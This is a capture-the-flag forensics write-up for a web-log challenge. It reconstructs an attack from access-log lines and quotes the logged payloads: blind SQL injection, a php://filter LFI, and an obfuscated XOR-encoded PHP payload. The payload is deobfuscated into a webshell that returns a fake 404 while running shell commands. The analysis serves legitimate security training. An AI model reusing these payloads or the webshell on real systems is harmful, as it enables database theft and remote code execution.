# weblog-1
This challenge involves investigating a log file that have multiple attack logs

## Solve
### Question 1
>Q: Please enter the PW of the admin account that was stolen by the attacker.

Write a script that get the ascii code when attacker try to sqli and get admin cred:
Sample log line:
```
172.17.0.1 - - [02/Jun/2020:09:52:08 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(username,0x3a,password)%20from%20users),%2032,1))=47,%20(select%201%20union%20select%202),%200) HTTP/1.1" 200 841 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```
Script:
```python
#!/usr/bin/env python3
import sys
import re
from urllib.parse import unquote_plus
from collections import defaultdict

if len(sys.argv) != 2:
    print("Usage: {} <access.log>".format(sys.argv[0]), file=sys.stderr)
    sys.exit(2)

logfile = sys.argv[1]

# Regex to extract the quoted request and the status code from a common log line.
# This should work with lines like:
# remote - - [date] "GET /path HTTP/1.1" 500 123 "-" "UA"
line_re = re.compile(r'".*?"\s+(\d{3})\s+\d+')

# Regex to capture position and ascii value from decoded URL.
# Accepts forms like:
# ord(substr((select group_concat(username,0x3a,password) from users),32,1))=47
# case-insensitive, allow spaces
sqli_re = re.compile(
    r'ord\s*\(\s*substr\s*\(\s*\(\s*select\s+group_concat\s*\(\s*username\s*,\s*0x3a\s*,\s*password\s*\)\s*from\s*users\s*\)\s*,\s*(\d+)\s*,\s*1\s*\)\s*\)\s*=\s*(\d+)',
    re.IGNORECASE
)

results = defaultdict(list)  # pos -> list of ascii values (should normally be one)

with open(logfile, 'r', errors='replace') as fh:
    for line in fh:
        # extract status code
        m = line_re.search(line)
        if not m:
            continue
        status = int(m.group(1))
        if status != 500:
            continue

        # extract the quoted request portion (method + path + protocol)
        # simpler extraction: find first " and second " and take the content
        try:
            first_quote = line.index('"')
            second_quote = line.index('"', first_quote + 1)
            request = line[first_quote + 1:second_quote]
        except ValueError:
            continue

        # request format: METHOD PATH PROTOCOL
        parts = request.split()
        if len(parts) < 2:
            continue
        path = parts[1]

        # URL-decode
        decoded = unquote_plus(path)

        # search for the SQLi pattern
        m2 = sqli_re.search(decoded)
        if m2:
            pos = int(m2.group(1))
            ascii_val = int(m2.group(2))
            results[pos].append(ascii_val)

# Print results sorted by position. Deduplicate values per position.
if not results:
    print("No matching 500 SQLi lines found.")
    sys.exit(0)

res = ""
for pos in sorted(results):
    vals = sorted(set(results[pos]))
    # print position, ascii code(s), printable char if in range
    chars = []
    for v in vals:
        if 32 <= v <= 126:
            res += chr(v)
            chars.append(chr(v))
        else:
            chars.append('?')
    print("pos {} -> ascii codes {}  chars {}".format(pos, vals, ''.join(chars)))
    
print(res)
```
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/b494389d2c507dbe5ff18fa972131930c02864e9d5ff713ab0f94846f5b15a5a.png)
**ANS: `Th1s_1s_Adm1n_P@SS`**

### Question 2
>Q: Enter the payload that the attacker used to extract the config.php code.
use:
```
cat access.log | grep config.php

...
172.17.0.1 - - [02/Jun/2020:09:54:18 +0000] "GET /admin/?page=php://filter/convert.base64-encode/resource=../config.php HTTP/1.1" 200 986 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```
**ANS: `php://filter/convert.base64-encode/resource=../config.php`**

### Question 3
>Q: Please enter the full path of the file used in the code execution attack through the LFI vulnerability. (Full path with file name)

Scroll to near the end of the file:
```
172.17.0.1 - - [02/Jun/2020:09:55:16 +0000] "GET /admin/?page=memo.php&memo=%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E HTTP/1.1" 200 1098 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:55:39 +0000] "GET /admin/?page=/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

**ANS: `/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732`**

### Question 4
>Q: Please enter the path of the generated webshell. (Full path with file name)
Payload:
```
%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E
```
Deobfuscated (replace date with log time):
```php
file_put_contents(
    '/var/www/html/uploads/images.php', 
    '<?php header("HTTP/1.1 404 Not Found"); system($_GET["c"]);'
);
```

**ANS: `/var/www/html/uploads/images.php`**

### Question 5
Look for entry below that which access /uploads/images.php (still 404 because the payload fool us with the fake response despite still executing code)
```
172.17.0.1 - - [02/Jun/2020:09:56:32 +0000] "GET /uploads/images.php?c=whoami HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

**ANS: `whoami`**
